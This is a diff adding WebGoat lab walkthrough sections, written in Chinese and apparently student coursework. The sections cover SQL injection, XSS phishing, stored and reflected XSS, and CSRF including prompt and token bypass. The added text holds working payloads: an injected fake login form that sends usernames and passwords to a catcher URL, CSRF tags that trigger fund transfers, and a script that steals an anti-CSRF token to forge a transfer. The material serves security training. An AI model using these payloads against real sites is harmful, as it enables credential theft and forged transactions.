@@ -279,7 +279,7 @@ Smith' or 1=1--
 101;select name from pins where cc_number=4321432143214321 and length(name)=4
 ```
 
-枚举可能的表示名字的字符串，最终确定`name`存储的字符串为`Jill`。
+对可能的表示名字的字符串进行爆破，最终确定`name`存储的字符串为`Jill`。
 
 ```
 101;select name from pins where cc_number=4321432143214321 and substr(name,1,4)='Jill'
@@ -291,34 +291,145 @@ Smith' or 1=1--
 
 ### 2.2.1 Phishing with XSS
 
+![image-20210530143321743](picture/image-20210530143321743.png)
 
+使用XSS，可以将其他元素添加到现有页面。首先将代码注入一个form，然后需要一个读取表单的脚本将收集的信息发送到攻击者。
+
+最终输入的字符串如下：
+
+```
+</form>
+<script>function hack(){ 
+XSSImage=new Image; XSSImage.src="http://127.0.0.1:8080/WebGoat/catcher ？ PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value;} 
+</script>
+
+<form name="phish"><br><br><HR><H3>
+This feature requires account login:</H3 ><br><br>
+Enter Username:<br><input type="text" name="user"><br>
+Enter Password:<br><input type="password" name = "pass"><br>
+<input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
+```
+
+输入后将看到一个提醒输入用户名和密码的表单如下：
+
+![image-20210530144017449](picture/image-20210530144017449.png)
+
+填写这些信息并点击login按钮，信息将被收集并发送的给攻击者。
 
 ### 2.2.2 Stored XSS Attacks
 
+![image-20210530145324762](picture/image-20210530145324762.png)
 
+在`Message`消息框中输入以下字符串：
+
+```
+<script>alert(1)</script>
+```
+
+点击 Submint 按钮后在 Message List 中生成了一个链接。点击后弹出消息提示框框，结果如下：
+
+![image-20210530152319967](picture/image-20210530152319967.png)
 
 ### 2.2.3 Reflected XSS Attacks
 
+![image-20210530152531350](picture/image-20210530152531350.png)
 
+在 access code 一栏输入以下字符串：
+
+```
+<script>alert(1)</script>
+```
+
+点击 Purchase 按钮后弹出消息提示框，结果如下：
+
+![image-20210530152751275](picture/image-20210530152751275.png)
 
 ### 2.2.4 Cross Site Request Forgery (CSRF)
+
+![image-20210530153625138](picture/image-20210530153625138.png)
+
+需要在消息框中嵌入HTML代码，此HTML代码应包含链接到不是真实图像的URL的图像标记？ 将仅在Web服务器上启动事务。
+
+因此，使用标题为“test”并输入在 Message 输入框中输入以下字符串：
+
+```
+<img src="attack?Screen=XXX&menu=YYY&transferFunds=5000">
+```
+
+点击 Submit 按钮创建新消息，在 Message List 中生成了一个链接。点击后将下载消息并将内容显示为HTML，结果如下：
+
+![image-20210530154423746](picture/image-20210530154423746.png)
 
 
 
 ### 2.2.5 CSRF Prompt By-Pass
 
+![image-20210530154625771](picture/image-20210530154625771.png)
 
+使用标题为“test”并输入在 Message 输入框中输入以下字符串：
+
+```
+<iframe
+    src="attack?Screen=1471017872&menu=900&transferFunds=5000">
+</iframe>
+
+<iframe
+    src="attack?Screen=1471017872&menu=900&transferFunds=CONFIRM">
+</iframe>
+```
+
+点击 Submit 按钮创建新消息，在 Message List 中生成了一个链接，点击链接结果如下：
+
+![image-20210530164131443](picture/image-20210530164131443.png)
 
 ### 2.2.6 CSRF Token By-Pass
 
+![image-20210530164147242](picture/image-20210530164147242.png)
 
+首先要嵌入一个框架（F1），在 F1 中找 Token，然后在嵌入第二个框架（F2），这个框架是转帐的链接，需要带上 token。
+
+使用标题为“test”并输入在 Message 输入框中输入以下字符串：
+
+```
+<script>
+function GetToken(){
+    var token = document.getElementById('F1').contentDocument.getElementsByTagName('form')[0][1].value;
+    LoadF2(token);
+}
+
+function LoadF2(token){
+    document.getElementById('F2').src = 'attack?Screen=803158781&menu=900&transferFunds=5000&CSRFToken='+token;
+}
+</script>
+
+
+<iframe src='attack?Screen=803158781&menu=900&transferFunds=main' onload='GetToken()' id='F1'>
+
+</iframe>
+
+<iframe src='' id='F2'>
+
+</iframe>
+```
+
+点击 Submit 按钮创建新消息，在 Message List 中生成了一个链接，点击链接结果如下：
+
+![image-20210530164419400](picture/image-20210530164419400.png)
 
 ### 2.2.7 HTTPOnly Test
+
+![image-20210530164436570](picture/image-20210530164436570.png)
 
 
 
 ---
 
+当不开启 HTTPOnly 时，点击 Read Cookie 按钮，可以顺利读取 Cookie，结果如下：
 
+![image-20210530164624721](picture/image-20210530164624721.png)
+
+而开启后再次点击则弹出空白消息提示框，结果如下：
+
+![image-20210530164711135](picture/image-20210530164711135.png)
 
 # 3 Web Attack
